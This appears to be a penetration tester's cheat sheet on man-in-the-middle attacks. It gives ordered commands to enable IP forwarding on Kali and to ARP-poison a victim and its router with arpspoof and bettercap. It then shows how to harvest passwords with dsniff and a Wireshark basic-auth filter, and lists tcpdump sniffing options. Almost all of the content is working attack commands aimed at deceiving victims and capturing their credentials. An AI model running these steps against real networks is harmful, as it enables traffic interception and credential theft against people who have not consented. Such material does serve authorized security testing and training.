# m - MITM

### LLMNR and NetBIOS NS&#x20;

[https://www.crowe.com/cybersecurity-watch/netbios-llmnr-giving-away-credentials#:\~:text=LLMNR%20stands%20for%20link%2Dlocal,host%20names%20on%20local%20networks.](https://www.crowe.com/cybersecurity-watch/netbios-llmnr-giving-away-credentials)

### Arp Poisoning

#### We 1st make our Kali machine able to forward traffic:

`echo 1 > /proc/sys/net/ipv4/ip_forward` - kali now acts as a router and forwards packet.

If the above dosen's work you can use:

`sysctl net.ipv4.ip_forward` - checks kali forwarding status if enabled or not, if net.ipv4.ip\_forward = 0 this means forwarding status is OFF.

`sudo sysctl -w net.ipv4.ip_forward=0` - **off/disable IP Forwarding.**

`sudo sysctl -w net.ipv4.ip_forward=1` - **on/enable IP Forwarding.**



Secondly, we convince the Victim that we are the Original Router, so send your request to me.

`arpspoof -i eth0 -t $target_ip $mainRouter_ip` - we specify the victim we want to confuse and the router ip we want to spoof.

Thirdly, we do same for the Original Router too, deceive it by tellin it we are the victim.

`arpspoof -i eth0 -t $mainRouter_ip $target_ip` - so the router now thinks we are the real client.

Lastly, we can use Wireshark to sniff the traffic. we can  apply the filter: !arp && http.authbasic.

### \[dsniff] utility

dsniff is a suite of tools that includes Active, Passive sniffers and MITM tools, and can be used for password sniffers for protocols like telnet, http, smtf, pop etc.

While the MITM attack is running, we just need to run dsniff on the interface and wait for the results.

`dsniff -i eth0` - we start to see credentials.

### \[tcpdump] utity

`tcpdump -i eth0` - sniff on the eth0 interface (promiscious mode).

`tcpdump -i eth0 -v` - more info.

`tcpdump -i eth0 -n` - disable DNS resolution.

`tcpdump -i eth0 -q` - quiet mode.&#x20;

`tcpdump -i eth0 host google.com` - filter for particular website/host.

`tcpdump -i eth0 src 192.168.0.100 and dst 192.168.0.178` - filter traffic for source and dst host.

`tcpdump -i eth0 -F filename.txt`  - import filter from a file.

`tcpdump -i eth0 -c 100` - specify count/number of packets to capture.

`tcpdump -i eth0 -w output.txt` - save capture to file. to read it,

`tcpdump -i eth0 -r output.txt` - to read the captured file.

`tcpdump -i eth0 | grep 192.168.1.1` - grep for that specific ip addr.

### \[ettercap]

`ettercap -G &` - to run in GUI mode.

### \[bettercap]

`sudo bettercap -iface wlan0` - launches the instance.

{% code overflow="wrap" lineNumbers="true" %}
```bash
>> net.probe on # scan all devices currently active on the network.
>> net.show # display all devices in network.
>> set arp.spoof.targets $victim_ip_to_spoof # enable spoofing on a host.
>> arp.spoof on # turn arpspoof on.
>> net.sniff on # then turn on net.sniff to start sniffing packets.
```
{% endcode %}
